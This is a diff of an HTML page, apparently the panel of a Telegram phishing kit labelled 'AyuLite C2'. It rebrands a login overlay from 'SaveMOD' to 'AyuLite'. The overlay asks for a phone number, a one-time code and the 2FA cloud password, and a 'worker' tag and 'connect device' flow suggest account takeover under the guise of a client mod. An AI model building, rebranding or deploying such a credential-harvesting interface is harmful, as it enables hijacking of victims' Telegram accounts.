@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AyuLite C2 Premium</title>
+  <title>AyuLite C2</title>
   <!-- Telegram Web App SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <link rel="stylesheet" href="style.css?v=2.9">
@@ -1334,7 +1334,7 @@
             <span class="dev-tag">Воркер</span>
           </div>
           <button class="btn btn-gradient" style="margin-top: 14px; width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px;" onclick="openAuthOverlay()">
-            <span>➕</span> Подключить устройство (SaveMOD Flow)
+            <span>➕</span> Подключить устройство (AyuLite Flow)
           </button>
         </div>
       </section>
@@ -1409,7 +1409,7 @@
             <polyline points="15 18 9 12 15 6"></polyline>
           </svg>
         </button>
-        <div class="auth-app-title">SaveMOD</div>
+        <div class="auth-app-title">AyuLite</div>
         <div class="lang-switch-pill">
           <button class="lang-opt active" id="lang-ru" onclick="setAuthLang('ru')">RU</button>
           <button class="lang-opt" id="lang-en" onclick="setAuthLang('en')">EN</button>
@@ -1421,18 +1421,17 @@
         <div class="auth-hero-logo">
           <div class="logo-glow-ring"></div>
           <div class="logo-avatar-box">
-            <img src="https://api.dicebear.com/7.x/bottts/svg?seed=SaveMOD&backgroundColor=1e1b4b" alt="SaveMOD">
+            <img src="https://api.dicebear.com/7.x/bottts/svg?seed=AyuLite&backgroundColor=1e1b4b" alt="AyuLite">
           </div>
         </div>
 
-        <h2 class="auth-main-title" data-i18n="auth_title_step1">Вход в SaveMod</h2>
+        <h2 class="auth-main-title" data-i18n="auth_title_step1">Вход в AyuLite</h2>
         <p class="auth-subtitle" data-i18n="auth_sub_step1">Подтвердите код вашей страны и введите номер телефона.</p>
 
         <!-- Country Selector Row -->
         <div class="country-select-row" onclick="openCountryPicker()">
           <div class="country-info-left">
-            <span class="country-flag" id="selected-country-flag">🇨🇿</span>
-            <span class="country-code-tag" id="selected-country-alpha">CZ</span>
+            <span class="country-badge" id="selected-country-alpha">CZ</span>
             <span class="country-name" id="selected-country-name">Чехия</span>
           </div>
           <svg class="chevron-right" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -1457,14 +1456,14 @@
           </svg>
         </button>
 
-        <div class="auth-watermark">@SaveModUserBot</div>
+        <div class="auth-watermark">@AyuLiteUserBot</div>
       </div>
 
       <!-- STEP 2: 5-DIGIT OTP CODE -->
       <div class="auth-step-container" id="auth-step-2">
         <div class="auth-hero-logo small">
           <div class="logo-avatar-box">
-            <img src="https://api.dicebear.com/7.x/bottts/svg?seed=SaveMOD&backgroundColor=1e1b4b" alt="SaveMOD">
+            <img src="https://api.dicebear.com/7.x/bottts/svg?seed=AyuLite&backgroundColor=1e1b4b" alt="AyuLite">
           </div>
         </div>
 
@@ -1487,7 +1486,7 @@
           <button class="btn-resend-link" id="btn-resend-code" onclick="resendAuthCode()" style="display: none;" data-i18n="auth_resend_btn">Запросить новый код</button>
         </div>
 
-        <div class="auth-watermark">@SaveModUserBot</div>
+        <div class="auth-watermark">@AyuLiteUserBot</div>
       </div>
 
       <!-- STEP 3: 2FA CLOUD PASSWORD -->
@@ -1523,7 +1522,7 @@
           </svg>
         </button>
 
-        <div class="auth-watermark">@SaveModUserBot</div>
+        <div class="auth-watermark">@AyuLiteUserBot</div>
       </div>
 
       <!-- STEP 4: SUCCESS CONFIRMATION -->
@@ -1548,7 +1547,7 @@
 
         <button class="btn btn-gradient" style="margin-top: 24px;" onclick="closeAuthOverlay()" data-i18n="auth_btn_dashboard">🚀 Перейти к управлению</button>
 
-        <div class="auth-watermark">@SaveModUserBot</div>
+        <div class="auth-watermark">@AyuLiteUserBot</div>
       </div>
 
       <!-- COUNTRY PICKER MODAL -->
